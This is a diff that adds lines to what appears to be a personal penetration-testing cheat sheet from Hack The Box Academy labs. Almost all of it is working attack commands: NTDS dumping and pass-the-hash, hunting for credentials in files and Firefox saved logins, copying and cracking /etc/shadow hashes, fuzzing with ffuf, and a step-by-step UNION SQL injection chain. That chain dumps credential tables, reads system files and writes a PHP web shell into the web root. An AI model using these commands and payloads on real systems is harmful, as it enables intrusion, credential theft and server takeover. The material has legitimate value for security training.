@@ -305,8 +305,67 @@ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+
 for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
 for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
 find /home/* -type f -name "*.txt" -o ! -name "*.*"
 for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+ls -l .mozilla/firefox/ | grep default 
+cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+python3.9 firefox_decrypt.py
+tail -n5 /home/*/.bash*
+
+`NamDT5125@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
+NamDT5125@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
+NamDT5125@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`
+hashcat -m 1800 -a 0 ../target/unshadowed.hashes ../target/rockyou.txt -o ../target/unshadowed.cracked
+`NamDT5125@htb[/htb]$ cat md5-hashes.list
+
+qNDkF0zJ3v8ylCOrKB0kt0
+E9uMSmiQeRh4pAAgzuvkq1`
+NamDT5125@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
+
+zip2john Docs.zip > zip.hash
+john --wordlist=./mut_password.list zip.hash 
+john zip.hash --show
+ 
+
+NamDT5125@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+ffuf -w subdomains-top1million-110000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
+ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+
+
+for i in $(seq 1 1000); do echo $i >> ids.txt; done
+ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:67930/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
+ffuf -w Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://faculty.academy.htb:35384/FUZZ -recursion -recursion-depth 1 -e .php,.php7,.phps
+
+
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+' UNION select 1,database(),2,3-- -
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+' UNION select 1, username, password, 4 from dev.credentials-- -
+
+' UNION SELECT 1, user(), 3, 4-- -
+' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+SELECT LOAD_FILE('/etc/passwd');
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+
+' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+sqlmap --cookie="PHPSESSID=434316675100ae92d691a2c7e88a5f25; security=low" -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --batch
